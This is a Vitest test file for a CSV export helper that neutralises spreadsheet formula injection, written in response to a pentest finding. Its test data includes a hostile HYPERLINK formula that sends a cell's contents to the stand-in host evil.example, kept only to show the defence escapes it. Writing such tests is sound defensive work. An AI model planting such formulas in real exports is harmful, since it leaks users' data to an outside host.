import { describe, expect, it } from 'vitest';
import { neutralizeFormula } from '../src/lib/csv';

/**
 * Pentest 2026-10-07, finding L6: a free-text field that starts with a
 * formula trigger executes when the export is opened in a spreadsheet.
 */
describe('neutralizeFormula', () => {
  it('prefixes every formula trigger with a single quote', () => {
    for (const lead of ['=', '+', '-', '@', '\t', '\r']) {
      expect(neutralizeFormula(`${lead}cmd`)).toBe(`'${lead}cmd`);
    }
    expect(neutralizeFormula('=HYPERLINK("https://evil.example/?"&A1,"open")')).toBe(
      `'=HYPERLINK("https://evil.example/?"&A1,"open")`,
    );
  });

  it('leaves ordinary text, numbers, dates, and empty cells alone', () => {
    for (const value of ['Dana', '2026-03-01', '12', '', 'a=b', ' -not a lead', 'Q1', 'in-progress']) {
      expect(neutralizeFormula(value)).toBe(value);
    }
  });
});
